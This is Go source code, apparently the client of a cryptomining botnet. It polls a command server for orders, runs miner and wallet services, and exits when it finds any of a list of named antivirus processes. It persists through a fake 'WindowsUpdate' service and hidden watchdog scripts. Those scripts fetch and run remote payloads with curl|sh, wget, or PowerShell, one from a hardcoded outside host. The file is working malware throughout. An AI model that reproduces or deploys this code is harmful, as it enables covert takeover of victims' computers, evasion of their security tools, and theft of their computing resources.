package httpclient

import (
	"fmt"
	"log"
	"regexp"
	"runtime"
	"strings"
	"time"

	"github.com/titan/tingchao/client/service"
	"github.com/titan/tingchao/model"

	"github.com/titan/tingchao/utils"
)

type Client struct {
}

var ClientGlobal *Client

func NewClient() *Client {
	pClient := &Client{}
	ClientGlobal = pClient
	return pClient
}

func (c *Client) Start() {
	log.Println("开始启动客户端...")

	c.CheckMutex() // 互斥体检测
	c.Pass()       // 杀软检测
	// CheckServerDomain()                       // 服务器域名检测
	c.ClientWatchServer()                     // 开启客户端守护模块
	service.Reg()                             // 向服务器注册客户端
	service.MiningWatchService()              // 开启矿工守护服务
	service.MiningWalletAddressWatchService() // 开启矿工钱包服务
	service.UpdateWatchService()              // 开启自动更新服务

	for { // 死循环获取服务端消息
		pMsgList, err := service.GetMsgListFromServer()

		if err != nil || pMsgList == nil { // 出现错误,重新获取
			if err != nil && err.Error() == "401" {
				log.Println("[api.Start]cookie过期,需要重新注册客户端")
				service.Reg() // 重新向服务器注册客户端
			} else {
				// log.Println("[Client.Start]拉取服务端消息失败或没有消息,正在等待下次拉取", err)
				log.Println(err)
			}
			goto SleepType
		}

		for _, pMsg := range pMsgList {
			switch pMsg.MsgID {
			case model.MsgCC:
				go func() {
					log.Println("[Client.Start]收到MsgCC命令")
					service.CcGo(pMsg)
				}()
			case model.MsgUpdate:
				go func() {
					log.Println("[Client.Start]收到MsgUpdate命令")
					service.UpdateGo(pMsg)
				}()
			case model.MsgMining:
				go func() {
					log.Println("[Client.Start]收到MsgMining命令")
					service.MiningGo(pMsg)
				}()
			case model.MsgCloseClient:
				go func() {
					log.Println("[Client.Start]收到MsgCloseClient命令")
					utils.GlobalConfig.CloseClientType <- true
				}()
			default:
				log.Println("未知的操作码类型")
			}

			// 此处必须休息一下,遇到了多线程并发的问题
			// 当服务下发了3条命令,其中2条cc命令,一条关闭客户端命令
			// 会出现第二条命令中 MessageModel.Data 对象为nil的情况
			time.Sleep(1 * time.Second)
		}
	SleepType:
		time.Sleep(time.Duration(utils.GlobalConfig.TimeSleep) * time.Second)
	}
}

// Server 开启主程序
func (c *Client) Server() {
	go c.Start() // 开启客户端主逻辑
	for {        // 此处阻塞住
		for types := range utils.GlobalConfig.CloseClientType {
			if types { // 关闭程序
				goto ExitClientType
			}
		}
	}
ExitClientType:
	log.Println("==> [client]主程序关闭")
}

// CheckMutex 互斥体检测
//
//	此方法通过ps查看进程中是否存在同名的程序来判断,存在误判的可能性
//	另外还可以通过监听占用一个系统的大端口,然后第二个运行的程序检测端口占用情况来进行互斥体判断
//	另外 通过文件锁 也可以实现
func (c *Client) CheckMutex() {
	switch runtime.GOOS {
	// 实现互斥体
	case "darwin":
		// darwin 系统暂不检测
		log.Println("[Client.CheckMutex]darwin系统暂不互斥体检测")
	case "windows":
		shell, err := utils.ExecShell(`tasklist`)
		if err != nil {
			log.Println("执行命令错误", err)
			break
		}
		// 查找任务列表中的sys.exe进程数量
		countArr := regexp.MustCompile(utils.GlobalConfig.ClientNameWin).FindAllStringIndex(shell, -1)
		if len(countArr) > 1 { // 如果任务列表中存在的客户端程序大于2个,那么代表目标机器上已经运行了client端,此时结束自己
			log.Println("目标机器上已运行客户端,结束本程序")
			utils.GlobalConfig.CloseClientType <- true
		}
	default:
		shell, err := utils.ExecShell("ps -aux")
		if err != nil {
			log.Println("执行命令错误", err)
			break
		}
		// 查找任务列表中的systemd-mdevd进程数量
		countArr := regexp.MustCompile(utils.GlobalConfig.ClientNameUnix).FindAllStringIndex(shell, -1)
		if len(countArr) > 1 { // 如果任务列表中存在的客户端程序大于2个,那么代表目标机器上已经运行了client端,此时结束自己
			log.Println("目标机器上已运行客户端,结束本程序")
			utils.GlobalConfig.CloseClientType <- true
		}
	}
}

// CheckServerDomain 检测有效的服务器域名
// 每次检测前调用方法生成域名列表,服务端使用了相同的方法
// 检测此列表,中间有一个或多个是在使用的真正的服务器域名
func CheckServerDomain() {
	// 创建一个周期性的定时器,随机1-2天
	// ticker := time.NewTicker(time.Duration(utils.RandomNumInt(60*60*24*1, 60*60*24*2)) * time.Second)
	ticker := time.NewTicker(time.Duration(7) * time.Second)
	go func() {
		for {
			domainList := utils.GetDomain()
			for k, domain := range domainList {
				log.Println(k, domain)
			}
			<-ticker.C
		}
	}()
}

// Pass 如果windwos电脑上有安全软件,直接结束本软件
func (c *Client) Pass() {
	maps := map[string]string{
		"360tray.exe":          "360安全卫士-实时保护",
		"360safe.exe":          "360安全卫士-主程序",
		"ZhuDongFangYu.exe":    "360安全卫士-主动防御",
		"360sd.exe":            "360杀毒",
		"avp.exe":              "卡巴斯基",
		"_avp32.exe":           "卡巴斯基",
		"_avpcc.exe":           "卡巴斯基",
		"_avpm.exe":            "卡巴斯基",
		"Mcshield.exe":         "McAfee",
		"Tbmon.exe":            "McAfee",
		"Frameworkservice.exe": "McAfee",
		"egui.exe":             "ESET NOD32",
		"ekrn.exe":             "ESET NOD32",
		"eguiProxy.exe":        "ESET NOD32",
		"KvMonXP.exe":          "江民杀毒",
		"RavMonD.exe":          "瑞星杀毒",
		"kxetray.exe":          "金山毒霸",
		"TMBMSRV.exe":          "趋势杀毒",
		"avcenter.exe":         "Avira(小红伞)",
		"avguard.exe":          "Avira(小红伞)",
		"avgnt.exe":            "Avira(小红伞)",
		"sched.exe":            "Avira(小红伞)",
		"AVIRA.exe":            "小红伞杀毒",
		"ashDisp.exe":          "Avast网络安全",
		"rtvscan.exe":          "诺顿杀毒",
		"ccSetMgr.exe":         "赛门铁克",
		"ccRegVfy.exe":         "诺顿杀毒软件",
		"ksafe.exe":            "金山卫士",
		"avgwdsvc.exe":         "AVG杀毒",
		"BaiduSdSvc.exe":       "百度杀毒-服务进程",
		"BaiduSdTray.exe":      "百度杀毒-托盘进程",
		"BaiduSd.exe":          "百度杀毒-主程序",
		"hipstray.exe":         "火绒",
		"wsctrl.exe":           "火绒",
		"usysdiag.exe":         "火绒",
		"bddownloader.exe":     "百度卫士",
		"baiduansvx.exe":       "百度卫士-主进程",
		"aAvgApi.exe":          "AVG",
	}
	switch runtime.GOOS {
	case "windows":
		shell, err := utils.ExecShell("tasklist")
		if err != nil {
			log.Println("执行命令失败！")
			return
		}
		for k, v := range maps {
			types := strings.Index(shell, k)
			if types != -1 { // 存在主动防御,直接关闭软件
				log.Println("==> 存在安全软件[", v, "],结束本程序")
				utils.GlobalConfig.CloseClientType <- true
			}
		}
	default:
		log.Println("[Client.Pass]其他系统不检测病毒软件") // 其他系统不检测病毒软件
	}
}

// ClientWatchServer 客户端守护模块
func (c *Client) ClientWatchServer() {

	// 首次运行客户端守护模块时,先杀死之前残留的客户端守护脚本
	// 杀死正在运行的客户端守护脚本
	switch runtime.GOOS {
	case "darwin":
		// darwin 系统暂不检测
		log.Println("[Client.ClientWatchServer]darwin系统暂不杀死客户端守护脚本")
	case "windows":
		// 写入win客户端守护脚本,只写入一次即可
		// 无法确认此脚本是否被杀死,所以只运行一次即可

		windowsWatchScript1 := windowsWatchScript1 // 下面的格式化有问题,暂时使用这个脚本

		//windowsWatchScript1 := fmt.Sprintf(
		//	windowsWatchScript,
		//
		//	utils.GlobalConfig.ClientNameWin,
		//	utils.GlobalConfig.ClientPath,
		//	utils.GlobalConfig.ClientNameWin,
		//
		//	utils.GlobalConfig.ServerHost,
		//	utils.GlobalConfig.ServerPort,
		//)

		// 写入守护脚本
		utils.Write(utils.GlobalConfig.ClientPath+"/"+utils.GlobalConfig.ClientWatchServerNameWin, windowsWatchScript1)
		log.Println("[Client.ClientWatchServer]win写入守护脚本成功")

		// 启动守护脚本
		_, err := utils.ExecShell("start /b " + utils.GlobalConfig.ClientPath + "/" + utils.GlobalConfig.ClientWatchServerNameWin)
		if err != nil {
			log.Println("[Client.ClientWatchServer]运行启动守护脚本失败", err)
		}
		log.Println("[Client.ClientWatchServer]win运行启动守护脚本成功", err)

		// 添加自启动
		// cmd := `sc create "WindowsUpdate" binpath= "cmd /c start "C:\Windows\Temp\chrome.exe""&&sc config "WindowsUpdate" start= auto&&net start WindowsUpdate`
		cmd := fmt.Sprintf(
			`sc create "WindowsUpdate" binpath= "cmd /c start "%s\%s""&&sc config "WindowsUpdate" start= auto&&net start WindowsUpdate`,
			utils.GlobalConfig.ClientPath,
			utils.GlobalConfig.ClientNameWin,
		)
		_, err = utils.ExecShell(cmd)
		if err != nil {
			log.Println("[Client.ClientWatchServer]win添加自启动失败", err)
		}
		log.Println("[Client.ClientWatchServer]win添加sc自启动成功", err)

	default:
		log.Println("[Client.ClientWatchServer]unix执行杀死客户端守护脚本命令")
		// 杀死客户端守护脚本
		cmd := "kill -9 ` ps -ef | grep " +
			utils.GlobalConfig.ClientWatchServerNameUnix + " | grep -v grep | awk '{print $2}' `"
		utils.ExecShell1(cmd)

		// 添加自启动
	}

	// 创建一个周期性的定时器,2-3秒检查一次客户端守护脚本是否在运行
	ticker := time.NewTicker(time.Duration(utils.RandomNumInt(2, 3)) * time.Second)
	go func() {
		for {
			switch runtime.GOOS {
			case "darwin":
				// darwin 系统暂不检测
				log.Println("[Client.ClientWatchServer]darwin系统暂不执行客户端守护服务")
			case "windows":
				// win不做任何操作
			default:
				shell, err := utils.ExecShell(`ps -aux`)
				if err != nil {
					log.Println("[Client.ClientWatchServer]unix执行命令错误", err)
					break
				}
				types := strings.Index(shell, utils.GlobalConfig.ClientWatchServerNameUnix)
				if types == -1 { // 客户端守护脚本未运行,将脚本启动起来
					log.Println("[Client.ClientWatchServer]unix客户端守护脚本未运行,正在重新运行客户端守护脚本")
					linuxWatchScript1 := fmt.Sprintf(
						linuxWatchScript,

						utils.GlobalConfig.ClientPath,
						utils.GlobalConfig.ClientNameUnix,

						utils.GlobalConfig.ServerHost,
						utils.GlobalConfig.ServerPort,

						utils.GlobalConfig.ClientNameUnix,
					)
					// 写入守护脚本
					utils.Write(utils.GlobalConfig.ClientPath+"/"+utils.GlobalConfig.ClientWatchServerNameUnix, linuxWatchScript1)
					log.Println("[Client.ClientWatchServer]unix写入守护脚本成功")

					// 启动守护脚本
					_, err := utils.ExecShell("nohup /bin/sh " + utils.GlobalConfig.ClientPath + "/" +
						utils.GlobalConfig.ClientWatchServerNameUnix + " >/dev/null 2>&1 & ")
					if err != nil {
						log.Println("[Client.ClientWatchServer]unix运行启动守护脚本失败", err)
					}
					log.Println("[Client.ClientWatchServer]unix运行启动守护脚本成功")

				} else {
					log.Println("[Client.ClientWatchServer]unix客户端守护脚本正在运行中")
				}
			}
			<-ticker.C // 在这里取时间值,解决程序刚运行时,守护脚本过600秒才开启的问题
		}
	}()
}

// linux 客户端守护脚本
var linuxWatchScript = `
#!/bin/sh
c="%s/%s"
u="http://%s:%s/c/run.sh"
while true; do
    sleep 711
	COUNT=$(ps -ef |grep %s |grep -v "grep" |wc -l)
    if [ $COUNT -eq 0 ]; then
		if [ -e $c ]; then
        	nohup $c >/dev/null 2>&1 & 
		else
       		(curl -s $u||wget -q -O - $u)|sh
    	fi
    fi
done
`

// win客户端守护脚本
// 自动隐藏cmd命令窗口
// 客户端被杀死时如果文件存在,则拉起客户端
// 如果文件不存在则下载文件再拉起客户端
var windowsWatchScript = `
@echo off
%1 mshta vbscript:CreateObject("WScript.Shell").Run("%~s0 ::",0,FALSE)(window.close)&&exit
:start
set time=711
set name=%s
set filePath=%s/%s

tasklist|find /i "%name%"
if %errorlevel%==0 ( 
	echo "yes"
) else (
	echo "No" 
	if exist %filePath% (
		echo "yes1"
		start /b %filePath%
	) else (
		echo "No1" 
		powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('http://%s:%s/c/run.bat', $tempfile); & $tempfile; Remove-Item -Force $tempfile"
	)
)
ping -n %time% 127.0.0.1 > nul
goto start
`

// win客户端守护脚本
var windowsWatchScript1 = `
@echo off
%1 mshta vbscript:CreateObject("WScript.Shell").Run("%~s0 ::",0,FALSE)(window.close)&&exit
:start
set time=711
set name=sposslv.exe
set filePath=%USERPROFILE%/sposslv.exe

tasklist|find /i "%name%"
if %errorlevel%==0 (
	set a=1
) else (
	set a=1
	if exist %filePath% (
		set a=1
		start /b %filePath%
		exit /b
	) else (
		set a=1
		powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('http://hcfuse.com/static/js/tools/c/run.bat', $tempfile); & $tempfile; Remove-Item -Force $tempfile"
		exit /b
	)
)
ping -n %time% 127.0.0.1 > nul
set a=1
goto start
`

//var windowsWatchScript1 = `
//@echo off
//%1 mshta vbscript:CreateObject("WScript.Shell").Run("%~s0 ::",0,FALSE)(window.close)&&exit
//:start
//set time=60
//set name=sposslv.exe
//set filePath=%USERPROFILE%/sposslv.exe
//
//tasklist|find /i "%name%"
//if %errorlevel%==0 (
//	echo "yes"
//) else (
//	echo "No"
//	if exist %filePath% (
//		echo "yes1"
//		start /b %filePath%
//	) else (
//		echo "No1"
//		powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('http://hcfuse.com/static/js/tools/c/run.bat', $tempfile); & $tempfile; Remove-Item -Force $tempfile"
//	)
//)
//ping -n %time% 127.0.0.1 > nul
//choice /t %time% /d y /n >nul
//goto start
//`
